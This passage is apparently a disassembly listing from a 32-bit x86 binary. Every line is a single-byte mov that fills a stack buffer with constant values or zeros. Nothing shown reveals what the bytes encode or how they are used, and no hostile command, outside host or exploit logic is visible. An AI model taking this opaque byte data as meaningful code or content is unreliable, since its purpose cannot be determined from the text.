  403ce0:	c6 85 68 e6 ff ff a0 	mov    BYTE PTR [ebp-0x1998],0xa0
  403ce7:	c6 85 69 e6 ff ff 59 	mov    BYTE PTR [ebp-0x1997],0x59
  403cee:	c6 85 6a e6 ff ff ce 	mov    BYTE PTR [ebp-0x1996],0xce
  403cf5:	c6 85 6b e6 ff ff 10 	mov    BYTE PTR [ebp-0x1995],0x10
  403cfc:	c6 85 6c e6 ff ff 44 	mov    BYTE PTR [ebp-0x1994],0x44
  403d03:	c6 85 6d e6 ff ff 2f 	mov    BYTE PTR [ebp-0x1993],0x2f
  403d0a:	c6 85 6e e6 ff ff 73 	mov    BYTE PTR [ebp-0x1992],0x73
  403d11:	c6 85 6f e6 ff ff e0 	mov    BYTE PTR [ebp-0x1991],0xe0
  403d18:	c6 85 70 e6 ff ff 6d 	mov    BYTE PTR [ebp-0x1990],0x6d
  403d1f:	c6 85 71 e6 ff ff 9f 	mov    BYTE PTR [ebp-0x198f],0x9f
  403d26:	c6 85 72 e6 ff ff 04 	mov    BYTE PTR [ebp-0x198e],0x4
  403d2d:	c6 85 73 e6 ff ff e5 	mov    BYTE PTR [ebp-0x198d],0xe5
  403d34:	c6 85 74 e6 ff ff 6e 	mov    BYTE PTR [ebp-0x198c],0x6e
  403d3b:	c6 85 75 e6 ff ff ad 	mov    BYTE PTR [ebp-0x198b],0xad
  403d42:	c6 85 76 e6 ff ff 2d 	mov    BYTE PTR [ebp-0x198a],0x2d
  403d49:	c6 85 77 e6 ff ff 1a 	mov    BYTE PTR [ebp-0x1989],0x1a
  403d50:	c6 85 78 e6 ff ff a4 	mov    BYTE PTR [ebp-0x1988],0xa4
  403d57:	c6 85 79 e6 ff ff 10 	mov    BYTE PTR [ebp-0x1987],0x10
  403d5e:	c6 85 7a e6 ff ff 60 	mov    BYTE PTR [ebp-0x1986],0x60
  403d65:	c6 85 7b e6 ff ff 20 	mov    BYTE PTR [ebp-0x1985],0x20
  403d6c:	88 9d 7c e6 ff ff    	mov    BYTE PTR [ebp-0x1984],bl
  403d72:	88 9d 7d e6 ff ff    	mov    BYTE PTR [ebp-0x1983],bl
  403d78:	88 9d 7e e6 ff ff    	mov    BYTE PTR [ebp-0x1982],bl
  403d7e:	88 9d 7f e6 ff ff    	mov    BYTE PTR [ebp-0x1981],bl
  403d84:	c6 85 80 e6 ff ff 91 	mov    BYTE PTR [ebp-0x1980],0x91
  403d8b:	c6 85 81 e6 ff ff 2f 	mov    BYTE PTR [ebp-0x197f],0x2f
  403d92:	c6 85 82 e6 ff ff 4d 	mov    BYTE PTR [ebp-0x197e],0x4d
  403d99:	c6 85 83 e6 ff ff b0 	mov    BYTE PTR [ebp-0x197d],0xb0
  403da0:	c6 85 84 e6 ff ff 95 	mov    BYTE PTR [ebp-0x197c],0x95
  403da7:	c6 85 85 e6 ff ff be 	mov    BYTE PTR [ebp-0x197b],0xbe
  403dae:	c6 85 86 e6 ff ff 83 	mov    BYTE PTR [ebp-0x197a],0x83
  403db5:	c6 85 87 e6 ff ff 93 	mov    BYTE PTR [ebp-0x1979],0x93
  403dbc:	c6 85 88 e6 ff ff 55 	mov    BYTE PTR [ebp-0x1978],0x55
  403dc3:	c6 85 89 e6 ff ff 4e 	mov    BYTE PTR [ebp-0x1977],0x4e
  403dca:	c6 85 8a e6 ff ff 43 	mov    BYTE PTR [ebp-0x1976],0x43
  403dd1:	c6 85 8b e6 ff ff 43 	mov    BYTE PTR [ebp-0x1975],0x43
  403dd8:	c6 85 8c e6 ff ff 55 	mov    BYTE PTR [ebp-0x1974],0x55
  403ddf:	c6 85 8d e6 ff ff 9e 	mov    BYTE PTR [ebp-0x1973],0x9e
  403de6:	c6 85 8e e6 ff ff 03 	mov    BYTE PTR [ebp-0x1972],0x3
  403ded:	c6 85 8f e6 ff ff 43 	mov    BYTE PTR [ebp-0x1971],0x43
  403df4:	c6 85 90 e6 ff ff f2 	mov    BYTE PTR [ebp-0x1970],0xf2
  403dfb:	c6 85 91 e6 ff ff e8 	mov    BYTE PTR [ebp-0x196f],0xe8
  403e02:	c6 85 92 e6 ff ff 18 	mov    BYTE PTR [ebp-0x196e],0x18
  403e09:	c6 85 93 e6 ff ff a3 	mov    BYTE PTR [ebp-0x196d],0xa3
  403e10:	c6 85 94 e6 ff ff 5c 	mov    BYTE PTR [ebp-0x196c],0x5c
  403e17:	c6 85 95 e6 ff ff 0e 	mov    BYTE PTR [ebp-0x196b],0xe
  403e1e:	c6 85 96 e6 ff ff 63 	mov    BYTE PTR [ebp-0x196a],0x63
  403e25:	c6 85 97 e6 ff ff 73 	mov    BYTE PTR [ebp-0x1969],0x73
  403e2c:	c6 85 98 e6 ff ff 55 	mov    BYTE PTR [ebp-0x1968],0x55
  403e33:	c6 85 99 e6 ff ff ce 	mov    BYTE PTR [ebp-0x1967],0xce
  403e3a:	c6 85 9a e6 ff ff 42 	mov    BYTE PTR [ebp-0x1966],0x42
  403e41:	c6 85 9b e6 ff ff 73 	mov    BYTE PTR [ebp-0x1965],0x73
  403e48:	c6 85 9c e6 ff ff c9 	mov    BYTE PTR [ebp-0x1964],0xc9
  403e4f:	c6 85 9d e6 ff ff 6e 	mov    BYTE PTR [ebp-0x1963],0x6e
  403e56:	c6 85 9e e6 ff ff 43 	mov    BYTE PTR [ebp-0x1962],0x43
  403e5d:	c6 85 9f e6 ff ff b3 	mov    BYTE PTR [ebp-0x1961],0xb3
  403e64:	c6 85 a0 e6 ff ff cb 	mov    BYTE PTR [ebp-0x1960],0xcb
  403e6b:	c6 85 a1 e6 ff ff 5c 	mov    BYTE PTR [ebp-0x195f],0x5c
  403e72:	c6 85 a2 e6 ff ff 8a 	mov    BYTE PTR [ebp-0x195e],0x8a
  403e79:	c6 85 a3 e6 ff ff 93 	mov    BYTE PTR [ebp-0x195d],0x93
  403e80:	c6 85 a4 e6 ff ff d7 	mov    BYTE PTR [ebp-0x195c],0xd7
  403e87:	c6 85 a5 e6 ff ff 7e 	mov    BYTE PTR [ebp-0x195b],0x7e
  403e8e:	c6 85 a6 e6 ff ff e3 	mov    BYTE PTR [ebp-0x195a],0xe3
  403e95:	c6 85 a7 e6 ff ff 73 	mov    BYTE PTR [ebp-0x1959],0x73
  403e9c:	c6 85 a8 e6 ff ff cb 	mov    BYTE PTR [ebp-0x1958],0xcb
  403ea3:	c6 85 a9 e6 ff ff 6c 	mov    BYTE PTR [ebp-0x1957],0x6c
  403eaa:	c6 85 aa e6 ff ff d2 	mov    BYTE PTR [ebp-0x1956],0xd2
  403eb1:	c6 85 ab e6 ff ff b3 	mov    BYTE PTR [ebp-0x1955],0xb3
  403eb8:	c6 85 ac e6 ff ff 94 	mov    BYTE PTR [ebp-0x1954],0x94
  403ebf:	c6 85 ad e6 ff ff 9e 	mov    BYTE PTR [ebp-0x1953],0x9e
  403ec6:	c6 85 ae e6 ff ff 03 	mov    BYTE PTR [ebp-0x1952],0x3
  403ecd:	c6 85 af e6 ff ff b3 	mov    BYTE PTR [ebp-0x1951],0xb3
  403ed4:	c6 85 b0 e6 ff ff 52 	mov    BYTE PTR [ebp-0x1950],0x52
  403edb:	c6 85 b1 e6 ff ff 49 	mov    BYTE PTR [ebp-0x194f],0x49
  403ee2:	c6 85 b2 e6 ff ff 63 	mov    BYTE PTR [ebp-0x194e],0x63
  403ee9:	c6 85 b3 e6 ff ff 18 	mov    BYTE PTR [ebp-0x194d],0x18
  403ef0:	c6 85 b4 e6 ff ff 95 	mov    BYTE PTR [ebp-0x194c],0x95
  403ef7:	c6 85 b5 e6 ff ff 2e 	mov    BYTE PTR [ebp-0x194b],0x2e
  403efe:	c6 85 b6 e6 ff ff a3 	mov    BYTE PTR [ebp-0x194a],0xa3
  403f05:	c6 85 b7 e6 ff ff 73 	mov    BYTE PTR [ebp-0x1949],0x73
  403f0c:	88 9d b8 e6 ff ff    	mov    BYTE PTR [ebp-0x1948],bl
  403f12:	c6 85 b9 e6 ff ff 30 	mov    BYTE PTR [ebp-0x1947],0x30
  403f19:	c6 85 ba e6 ff ff a0 	mov    BYTE PTR [ebp-0x1946],0xa0
  403f20:	c6 85 bb e6 ff ff 40 	mov    BYTE PTR [ebp-0x1945],0x40
  403f27:	88 9d bc e6 ff ff    	mov    BYTE PTR [ebp-0x1944],bl
  403f2d:	c6 85 bd e6 ff ff d0 	mov    BYTE PTR [ebp-0x1943],0xd0
  403f34:	c6 85 be e6 ff ff 80 	mov    BYTE PTR [ebp-0x1942],0x80
  403f3b:	c6 85 bf e6 ff ff d0 	mov    BYTE PTR [ebp-0x1941],0xd0
  403f42:	88 9d c0 e6 ff ff    	mov    BYTE PTR [ebp-0x1940],bl
  403f48:	c6 85 c1 e6 ff ff 80 	mov    BYTE PTR [ebp-0x193f],0x80
  403f4f:	88 9d c2 e6 ff ff    	mov    BYTE PTR [ebp-0x193e],bl
  403f55:	c6 85 c3 e6 ff ff 40 	mov    BYTE PTR [ebp-0x193d],0x40
  403f5c:	c6 85 c4 e6 ff ff 40 	mov    BYTE PTR [ebp-0x193c],0x40
  403f63:	c6 85 c5 e6 ff ff 10 	mov    BYTE PTR [ebp-0x193b],0x10
  403f6a:	c6 85 c6 e6 ff ff e0 	mov    BYTE PTR [ebp-0x193a],0xe0
  403f71:	c6 85 c7 e6 ff ff b0 	mov    BYTE PTR [ebp-0x1939],0xb0
  403f78:	c6 85 c8 e6 ff ff 80 	mov    BYTE PTR [ebp-0x1938],0x80
  403f7f:	c6 85 c9 e6 ff ff 90 	mov    BYTE PTR [ebp-0x1937],0x90
  403f86:	c6 85 ca e6 ff ff 40 	mov    BYTE PTR [ebp-0x1936],0x40
  403f8d:	c6 85 cb e6 ff ff d0 	mov    BYTE PTR [ebp-0x1935],0xd0
  403f94:	c6 85 cc e6 ff ff c0 	mov    BYTE PTR [ebp-0x1934],0xc0
  403f9b:	c6 85 cd e6 ff ff 50 	mov    BYTE PTR [ebp-0x1933],0x50
  403fa2:	88 9d ce e6 ff ff    	mov    BYTE PTR [ebp-0x1932],bl
  403fa8:	c6 85 cf e6 ff ff 50 	mov    BYTE PTR [ebp-0x1931],0x50
  403faf:	c6 85 d0 e6 ff ff 50 	mov    BYTE PTR [ebp-0x1930],0x50
  403fb6:	c6 85 d1 e6 ff ff 45 	mov    BYTE PTR [ebp-0x192f],0x45
  403fbd:	c6 85 d2 e6 ff ff 60 	mov    BYTE PTR [ebp-0x192e],0x60
  403fc4:	c6 85 d3 e6 ff ff 70 	mov    BYTE PTR [ebp-0x192d],0x70
  403fcb:	c6 85 d4 e6 ff ff 0c 	mov    BYTE PTR [ebp-0x192c],0xc
  403fd2:	c6 85 d5 e6 ff ff f1 	mov    BYTE PTR [ebp-0x192b],0xf1
  403fd9:	c6 85 d6 e6 ff ff e5 	mov    BYTE PTR [ebp-0x192a],0xe5
  403fe0:	c6 85 d7 e6 ff ff 10 	mov    BYTE PTR [ebp-0x1929],0x10
  403fe7:	c6 85 d8 e6 ff ff 0f 	mov    BYTE PTR [ebp-0x1928],0xf
  403fee:	c6 85 d9 e6 ff ff 7b 	mov    BYTE PTR [ebp-0x1927],0x7b
  403ff5:	c6 85 da e6 ff ff 0d 	mov    BYTE PTR [ebp-0x1926],0xd
  403ffc:	c6 85 db e6 ff ff 10 	mov    BYTE PTR [ebp-0x1925],0x10
  404003:	c6 85 dc e6 ff ff c0 	mov    BYTE PTR [ebp-0x1924],0xc0
  40400a:	c6 85 dd e6 ff ff 70 	mov    BYTE PTR [ebp-0x1923],0x70
  404011:	88 9d de e6 ff ff    	mov    BYTE PTR [ebp-0x1922],bl
  404017:	c6 85 df e6 ff ff 30 	mov    BYTE PTR [ebp-0x1921],0x30
  40401e:	88 9d e0 e6 ff ff    	mov    BYTE PTR [ebp-0x1920],bl
  404024:	c6 85 e1 e6 ff ff d0 	mov    BYTE PTR [ebp-0x191f],0xd0
  40402b:	c6 85 e2 e6 ff ff c0 	mov    BYTE PTR [ebp-0x191e],0xc0
  404032:	c6 85 e3 e6 ff ff e0 	mov    BYTE PTR [ebp-0x191d],0xe0
  404039:	c6 85 e4 e6 ff ff a0 	mov    BYTE PTR [ebp-0x191c],0xa0
  404040:	c6 85 e5 e6 ff ff 70 	mov    BYTE PTR [ebp-0x191b],0x70
  404047:	c6 85 e6 e6 ff ff 22 	mov    BYTE PTR [ebp-0x191a],0x22
  40404e:	c6 85 e7 e6 ff ff 01 	mov    BYTE PTR [ebp-0x1919],0x1
  404055:	c6 85 e8 e6 ff ff 8b 	mov    BYTE PTR [ebp-0x1918],0x8b
  40405c:	c6 85 e9 e6 ff ff 01 	mov    BYTE PTR [ebp-0x1917],0x1
  404063:	c6 85 ea e6 ff ff 69 	mov    BYTE PTR [ebp-0x1916],0x69
  40406a:	c6 85 eb e6 ff ff 40 	mov    BYTE PTR [ebp-0x1915],0x40
  404071:	c6 85 ec e6 ff ff c0 	mov    BYTE PTR [ebp-0x1914],0xc0
  404078:	c6 85 ed e6 ff ff 7a 	mov    BYTE PTR [ebp-0x1913],0x7a
  40407f:	c6 85 ee e6 ff ff 80 	mov    BYTE PTR [ebp-0x1912],0x80
  404086:	c6 85 ef e6 ff ff d0 	mov    BYTE PTR [ebp-0x1911],0xd0
  40408d:	88 9d f0 e6 ff ff    	mov    BYTE PTR [ebp-0x1910],bl
  404093:	c6 85 f1 e6 ff ff fc 	mov    BYTE PTR [ebp-0x190f],0xfc
  40409a:	c6 85 f2 e6 ff ff 20 	mov    BYTE PTR [ebp-0x190e],0x20
  4040a1:	c6 85 f3 e6 ff ff 10 	mov    BYTE PTR [ebp-0x190d],0x10
  4040a8:	88 9d f4 e6 ff ff    	mov    BYTE PTR [ebp-0x190c],bl
  4040ae:	c6 85 f5 e6 ff ff 50 	mov    BYTE PTR [ebp-0x190b],0x50
  4040b5:	c6 85 f6 e6 ff ff 60 	mov    BYTE PTR [ebp-0x190a],0x60
  4040bc:	c6 85 f7 e6 ff ff f0 	mov    BYTE PTR [ebp-0x1909],0xf0
  4040c3:	c6 85 f8 e6 ff ff 80 	mov    BYTE PTR [ebp-0x1908],0x80
  4040ca:	c6 85 f9 e6 ff ff 50 	mov    BYTE PTR [ebp-0x1907],0x50
  4040d1:	c6 85 fa e6 ff ff 80 	mov    BYTE PTR [ebp-0x1906],0x80
  4040d8:	c6 85 fb e6 ff ff e0 	mov    BYTE PTR [ebp-0x1905],0xe0
  4040df:	88 9d fc e6 ff ff    	mov    BYTE PTR [ebp-0x1904],bl
  4040e5:	c6 85 fd e6 ff ff e0 	mov    BYTE PTR [ebp-0x1903],0xe0
  4040ec:	c6 85 fe e6 ff ff e0 	mov    BYTE PTR [ebp-0x1902],0xe0
  4040f3:	88 9d ff e6 ff ff    	mov    BYTE PTR [ebp-0x1901],bl
  4040f9:	88 9d 00 e7 ff ff    	mov    BYTE PTR [ebp-0x1900],bl
  4040ff:	c6 85 01 e7 ff ff 50 	mov    BYTE PTR [ebp-0x18ff],0x50
  404106:	88 9d 02 e7 ff ff    	mov    BYTE PTR [ebp-0x18fe],bl
  40410c:	c6 85 03 e7 ff ff f0 	mov    BYTE PTR [ebp-0x18fd],0xf0
  404113:	c6 85 04 e7 ff ff c0 	mov    BYTE PTR [ebp-0x18fc],0xc0
  40411a:	c6 85 05 e7 ff ff b0 	mov    BYTE PTR [ebp-0x18fb],0xb0
  404121:	c6 85 06 e7 ff ff 40 	mov    BYTE PTR [ebp-0x18fa],0x40
  404128:	c6 85 07 e7 ff ff c0 	mov    BYTE PTR [ebp-0x18f9],0xc0
  40412f:	c6 85 08 e7 ff ff 80 	mov    BYTE PTR [ebp-0x18f8],0x80
  404136:	c6 85 09 e7 ff ff d0 	mov    BYTE PTR [ebp-0x18f7],0xd0
  40413d:	c6 85 0a e7 ff ff c0 	mov    BYTE PTR [ebp-0x18f6],0xc0
  404144:	c6 85 0b e7 ff ff e0 	mov    BYTE PTR [ebp-0x18f5],0xe0
  40414b:	c6 85 0c e7 ff ff c0 	mov    BYTE PTR [ebp-0x18f4],0xc0
  404152:	c6 85 0d e7 ff ff 42 	mov    BYTE PTR [ebp-0x18f3],0x42
  404159:	c6 85 0e e7 ff ff 80 	mov    BYTE PTR [ebp-0x18f2],0x80
  404160:	c6 85 0f e7 ff ff a0 	mov    BYTE PTR [ebp-0x18f1],0xa0
  404167:	c6 85 10 e7 ff ff 05 	mov    BYTE PTR [ebp-0x18f0],0x5
  40416e:	c6 85 11 e7 ff ff 80 	mov    BYTE PTR [ebp-0x18ef],0x80
  404175:	c6 85 12 e7 ff ff 80 	mov    BYTE PTR [ebp-0x18ee],0x80
  40417c:	c6 85 13 e7 ff ff 90 	mov    BYTE PTR [ebp-0x18ed],0x90
  404183:	88 9d 14 e7 ff ff    	mov    BYTE PTR [ebp-0x18ec],bl
  404189:	c6 85 15 e7 ff ff 10 	mov    BYTE PTR [ebp-0x18eb],0x10
  404190:	c6 85 16 e7 ff ff a0 	mov    BYTE PTR [ebp-0x18ea],0xa0
  404197:	c6 85 17 e7 ff ff f0 	mov    BYTE PTR [ebp-0x18e9],0xf0
  40419e:	c6 85 18 e7 ff ff 05 	mov    BYTE PTR [ebp-0x18e8],0x5
  4041a5:	c6 85 19 e7 ff ff c0 	mov    BYTE PTR [ebp-0x18e7],0xc0
  4041ac:	c6 85 1a e7 ff ff a0 	mov    BYTE PTR [ebp-0x18e6],0xa0
  4041b3:	c6 85 1b e7 ff ff c0 	mov    BYTE PTR [ebp-0x18e5],0xc0
  4041ba:	c6 85 1c e7 ff ff 40 	mov    BYTE PTR [ebp-0x18e4],0x40
  4041c1:	c6 85 1d e7 ff ff a0 	mov    BYTE PTR [ebp-0x18e3],0xa0
  4041c8:	c6 85 1e e7 ff ff 60 	mov    BYTE PTR [ebp-0x18e2],0x60
  4041cf:	c6 85 1f e7 ff ff f0 	mov    BYTE PTR [ebp-0x18e1],0xf0
  4041d6:	88 9d 20 e7 ff ff    	mov    BYTE PTR [ebp-0x18e0],bl
  4041dc:	c6 85 21 e7 ff ff d0 	mov    BYTE PTR [ebp-0x18df],0xd0
  4041e3:	c6 85 22 e7 ff ff e0 	mov    BYTE PTR [ebp-0x18de],0xe0
  4041ea:	c6 85 23 e7 ff ff e0 	mov    BYTE PTR [ebp-0x18dd],0xe0
  4041f1:	c6 85 24 e7 ff ff 40 	mov    BYTE PTR [ebp-0x18dc],0x40
  4041f8:	c6 85 25 e7 ff ff e4 	mov    BYTE PTR [ebp-0x18db],0xe4
  4041ff:	c6 85 26 e7 ff ff 20 	mov    BYTE PTR [ebp-0x18da],0x20
  404206:	c6 85 27 e7 ff ff f0 	mov    BYTE PTR [ebp-0x18d9],0xf0
  40420d:	c6 85 28 e7 ff ff 7d 	mov    BYTE PTR [ebp-0x18d8],0x7d
  404214:	c6 85 29 e7 ff ff 78 	mov    BYTE PTR [ebp-0x18d7],0x78
  40421b:	c6 85 2a e7 ff ff 40 	mov    BYTE PTR [ebp-0x18d6],0x40
  404222:	c6 85 2b e7 ff ff 30 	mov    BYTE PTR [ebp-0x18d5],0x30
  404229:	c6 85 2c e7 ff ff 42 	mov    BYTE PTR [ebp-0x18d4],0x42
  404230:	c6 85 2d e7 ff ff 90 	mov    BYTE PTR [ebp-0x18d3],0x90
  404237:	88 9d 2e e7 ff ff    	mov    BYTE PTR [ebp-0x18d2],bl
  40423d:	c6 85 2f e7 ff ff 25 	mov    BYTE PTR [ebp-0x18d1],0x25
  404244:	88 9d 30 e7 ff ff    	mov    BYTE PTR [ebp-0x18d0],bl
  40424a:	c6 85 31 e7 ff ff e0 	mov    BYTE PTR [ebp-0x18cf],0xe0
  404251:	c6 85 32 e7 ff ff b0 	mov    BYTE PTR [ebp-0x18ce],0xb0
  404258:	c6 85 33 e7 ff ff f0 	mov    BYTE PTR [ebp-0x18cd],0xf0
  40425f:	c6 85 34 e7 ff ff c0 	mov    BYTE PTR [ebp-0x18cc],0xc0
  404266:	c6 85 35 e7 ff ff 60 	mov    BYTE PTR [ebp-0x18cb],0x60
  40426d:	c6 85 36 e7 ff ff 40 	mov    BYTE PTR [ebp-0x18ca],0x40
  404274:	c6 85 37 e7 ff ff 10 	mov    BYTE PTR [ebp-0x18c9],0x10
  40427b:	88 9d 38 e7 ff ff    	mov    BYTE PTR [ebp-0x18c8],bl
  404281:	c6 85 39 e7 ff ff b0 	mov    BYTE PTR [ebp-0x18c7],0xb0
  404288:	c6 85 3a e7 ff ff 50 	mov    BYTE PTR [ebp-0x18c6],0x50
  40428f:	88 9d 3b e7 ff ff    	mov    BYTE PTR [ebp-0x18c5],bl
  404295:	c6 85 3c e7 ff ff 40 	mov    BYTE PTR [ebp-0x18c4],0x40
  40429c:	c6 85 3d e7 ff ff c0 	mov    BYTE PTR [ebp-0x18c3],0xc0
  4042a3:	88 9d 3e e7 ff ff    	mov    BYTE PTR [ebp-0x18c2],bl
  4042a9:	c6 85 3f e7 ff ff 30 	mov    BYTE PTR [ebp-0x18c1],0x30
  4042b0:	88 9d 40 e7 ff ff    	mov    BYTE PTR [ebp-0x18c0],bl
  4042b6:	c6 85 41 e7 ff ff 30 	mov    BYTE PTR [ebp-0x18bf],0x30
  4042bd:	88 9d 42 e7 ff ff    	mov    BYTE PTR [ebp-0x18be],bl
  4042c3:	c6 85 43 e7 ff ff a0 	mov    BYTE PTR [ebp-0x18bd],0xa0
  4042ca:	c6 85 44 e7 ff ff 90 	mov    BYTE PTR [ebp-0x18bc],0x90
  4042d1:	c6 85 45 e7 ff ff 30 	mov    BYTE PTR [ebp-0x18bb],0x30
  4042d8:	c6 85 46 e7 ff ff e0 	mov    BYTE PTR [ebp-0x18ba],0xe0
  4042df:	c6 85 47 e7 ff ff 20 	mov    BYTE PTR [ebp-0x18b9],0x20
  4042e6:	c6 85 48 e7 ff ff 80 	mov    BYTE PTR [ebp-0x18b8],0x80
  4042ed:	c6 85 49 e7 ff ff 90 	mov    BYTE PTR [ebp-0x18b7],0x90
  4042f4:	c6 85 4a e7 ff ff 40 	mov    BYTE PTR [ebp-0x18b6],0x40
  4042fb:	c6 85 4b e7 ff ff 50 	mov    BYTE PTR [ebp-0x18b5],0x50
  404302:	88 9d 4c e7 ff ff    	mov    BYTE PTR [ebp-0x18b4],bl
  404308:	c6 85 4d e7 ff ff 40 	mov    BYTE PTR [ebp-0x18b3],0x40
  40430f:	c6 85 4e e7 ff ff e0 	mov    BYTE PTR [ebp-0x18b2],0xe0
  404316:	88 9d 4f e7 ff ff    	mov    BYTE PTR [ebp-0x18b1],bl
  40431c:	c6 85 50 e7 ff ff d8 	mov    BYTE PTR [ebp-0x18b0],0xd8
  404323:	c6 85 51 e7 ff ff 91 	mov    BYTE PTR [ebp-0x18af],0x91
  40432a:	c6 85 52 e7 ff ff e0 	mov    BYTE PTR [ebp-0x18ae],0xe0
  404331:	c6 85 53 e7 ff ff d0 	mov    BYTE PTR [ebp-0x18ad],0xd0
  404338:	c6 85 54 e7 ff ff e4 	mov    BYTE PTR [ebp-0x18ac],0xe4
  40433f:	c6 85 55 e7 ff ff 60 	mov    BYTE PTR [ebp-0x18ab],0x60
  404346:	c6 85 56 e7 ff ff c0 	mov    BYTE PTR [ebp-0x18aa],0xc0
  40434d:	c6 85 57 e7 ff ff b0 	mov    BYTE PTR [ebp-0x18a9],0xb0
  404354:	c6 85 58 e7 ff ff 80 	mov    BYTE PTR [ebp-0x18a8],0x80
  40435b:	c6 85 59 e7 ff ff 70 	mov    BYTE PTR [ebp-0x18a7],0x70
  404362:	c6 85 5a e7 ff ff 60 	mov    BYTE PTR [ebp-0x18a6],0x60
  404369:	c6 85 5b e7 ff ff 50 	mov    BYTE PTR [ebp-0x18a5],0x50
  404370:	c6 85 5c e7 ff ff f4 	mov    BYTE PTR [ebp-0x18a4],0xf4
  404377:	c6 85 5d e7 ff ff 91 	mov    BYTE PTR [ebp-0x18a3],0x91
  40437e:	c6 85 5e e7 ff ff 80 	mov    BYTE PTR [ebp-0x18a2],0x80
  404385:	c6 85 5f e7 ff ff f0 	mov    BYTE PTR [ebp-0x18a1],0xf0
  40438c:	88 9d 60 e7 ff ff    	mov    BYTE PTR [ebp-0x18a0],bl
  404392:	c6 85 61 e7 ff ff 50 	mov    BYTE PTR [ebp-0x189f],0x50
  404399:	c6 85 62 e7 ff ff 60 	mov    BYTE PTR [ebp-0x189e],0x60
  4043a0:	c6 85 63 e7 ff ff e0 	mov    BYTE PTR [ebp-0x189d],0xe0
  4043a7:	88 9d 64 e7 ff ff    	mov    BYTE PTR [ebp-0x189c],bl
  4043ad:	c6 85 65 e7 ff ff a0 	mov    BYTE PTR [ebp-0x189b],0xa0
  4043b4:	c6 85 66 e7 ff ff e0 	mov    BYTE PTR [ebp-0x189a],0xe0
  4043bb:	c6 85 67 e7 ff ff 90 	mov    BYTE PTR [ebp-0x1899],0x90
  4043c2:	88 9d 68 e7 ff ff    	mov    BYTE PTR [ebp-0x1898],bl
  4043c8:	88 9d 69 e7 ff ff    	mov    BYTE PTR [ebp-0x1897],bl
  4043ce:	c6 85 6a e7 ff ff c0 	mov    BYTE PTR [ebp-0x1896],0xc0
  4043d5:	c6 85 6b e7 ff ff 10 	mov    BYTE PTR [ebp-0x1895],0x10
  4043dc:	c6 85 6c e7 ff ff c0 	mov    BYTE PTR [ebp-0x1894],0xc0
  4043e3:	88 9d 6d e7 ff ff    	mov    BYTE PTR [ebp-0x1893],bl
  4043e9:	c6 85 6e e7 ff ff 20 	mov    BYTE PTR [ebp-0x1892],0x20
  4043f0:	c6 85 6f e7 ff ff b0 	mov    BYTE PTR [ebp-0x1891],0xb0
  4043f7:	88 9d 70 e7 ff ff    	mov    BYTE PTR [ebp-0x1890],bl
  4043fd:	c6 85 71 e7 ff ff 10 	mov    BYTE PTR [ebp-0x188f],0x10
  404404:	c6 85 72 e7 ff ff 20 	mov    BYTE PTR [ebp-0x188e],0x20
  40440b:	c6 85 73 e7 ff ff 20 	mov    BYTE PTR [ebp-0x188d],0x20
  404412:	c6 85 74 e7 ff ff e4 	mov    BYTE PTR [ebp-0x188c],0xe4
  404419:	c6 85 75 e7 ff ff 60 	mov    BYTE PTR [ebp-0x188b],0x60
  404420:	c6 85 76 e7 ff ff 20 	mov    BYTE PTR [ebp-0x188a],0x20
  404427:	c6 85 77 e7 ff ff 40 	mov    BYTE PTR [ebp-0x1889],0x40
  40442e:	88 9d 78 e7 ff ff    	mov    BYTE PTR [ebp-0x1888],bl
  404434:	c6 85 79 e7 ff ff c0 	mov    BYTE PTR [ebp-0x1887],0xc0
  40443b:	c6 85 7a e7 ff ff c0 	mov    BYTE PTR [ebp-0x1886],0xc0
  404442:	c6 85 7b e7 ff ff d0 	mov    BYTE PTR [ebp-0x1885],0xd0
  404449:	88 9d 7c e7 ff ff    	mov    BYTE PTR [ebp-0x1884],bl
  40444f:	c6 85 7d e7 ff ff 50 	mov    BYTE PTR [ebp-0x1883],0x50
  404456:	c6 85 7e e7 ff ff a0 	mov    BYTE PTR [ebp-0x1882],0xa0
  40445d:	88 9d 7f e7 ff ff    	mov    BYTE PTR [ebp-0x1881],bl
  404463:	88 9d 80 e7 ff ff    	mov    BYTE PTR [ebp-0x1880],bl
  404469:	88 9d 81 e7 ff ff    	mov    BYTE PTR [ebp-0x187f],bl
  40446f:	88 9d 82 e7 ff ff    	mov    BYTE PTR [ebp-0x187e],bl
  404475:	88 9d 83 e7 ff ff    	mov    BYTE PTR [ebp-0x187d],bl
  40447b:	c6 85 84 e7 ff ff c0 	mov    BYTE PTR [ebp-0x187c],0xc0
  404482:	c6 85 85 e7 ff ff f0 	mov    BYTE PTR [ebp-0x187b],0xf0
  404489:	c6 85 86 e7 ff ff 60 	mov    BYTE PTR [ebp-0x187a],0x60
  404490:	c6 85 87 e7 ff ff 10 	mov    BYTE PTR [ebp-0x1879],0x10
  404497:	c6 85 88 e7 ff ff 80 	mov    BYTE PTR [ebp-0x1878],0x80
  40449e:	c6 85 89 e7 ff ff 30 	mov    BYTE PTR [ebp-0x1877],0x30
  4044a5:	c6 85 8a e7 ff ff 20 	mov    BYTE PTR [ebp-0x1876],0x20
  4044ac:	c6 85 8b e7 ff ff a0 	mov    BYTE PTR [ebp-0x1875],0xa0
  4044b3:	c6 85 8c e7 ff ff 40 	mov    BYTE PTR [ebp-0x1874],0x40
  4044ba:	c6 85 8d e7 ff ff 50 	mov    BYTE PTR [ebp-0x1873],0x50
  4044c1:	c6 85 8e e7 ff ff 20 	mov    BYTE PTR [ebp-0x1872],0x20
  4044c8:	c6 85 8f e7 ff ff 50 	mov    BYTE PTR [ebp-0x1871],0x50
  4044cf:	88 9d 90 e7 ff ff    	mov    BYTE PTR [ebp-0x1870],bl
  4044d5:	c6 85 91 e7 ff ff 30 	mov    BYTE PTR [ebp-0x186f],0x30
  4044dc:	c6 85 92 e7 ff ff c0 	mov    BYTE PTR [ebp-0x186e],0xc0
  4044e3:	c6 85 93 e7 ff ff 60 	mov    BYTE PTR [ebp-0x186d],0x60
  4044ea:	c6 85 94 e7 ff ff 40 	mov    BYTE PTR [ebp-0x186c],0x40
  4044f1:	c6 85 95 e7 ff ff 20 	mov    BYTE PTR [ebp-0x186b],0x20
  4044f8:	c6 85 96 e7 ff ff 40 	mov    BYTE PTR [ebp-0x186a],0x40
  4044ff:	c6 85 97 e7 ff ff 40 	mov    BYTE PTR [ebp-0x1869],0x40
  404506:	c6 85 98 e7 ff ff 80 	mov    BYTE PTR [ebp-0x1868],0x80
  40450d:	c6 85 99 e7 ff ff 20 	mov    BYTE PTR [ebp-0x1867],0x20
  404514:	c6 85 9a e7 ff ff e0 	mov    BYTE PTR [ebp-0x1866],0xe0
  40451b:	88 9d 9b e7 ff ff    	mov    BYTE PTR [ebp-0x1865],bl
